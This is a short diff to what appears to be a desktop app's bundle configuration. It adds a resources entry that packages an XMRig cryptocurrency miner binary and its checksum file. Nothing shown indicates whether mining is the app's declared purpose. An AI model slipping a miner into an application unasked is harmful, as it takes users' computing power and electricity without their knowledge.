@@ -10,6 +10,10 @@
       "icons/icon.icns",
       "icons/icon.png"
     ],
+    "resources": {
+      "resources/miner/xmrig": "miner/xmrig",
+      "resources/miner/xmrig.sha256": "miner/xmrig.sha256"
+    },
     "macOS": {
       "minimumSystemVersion": "12.0"
     }
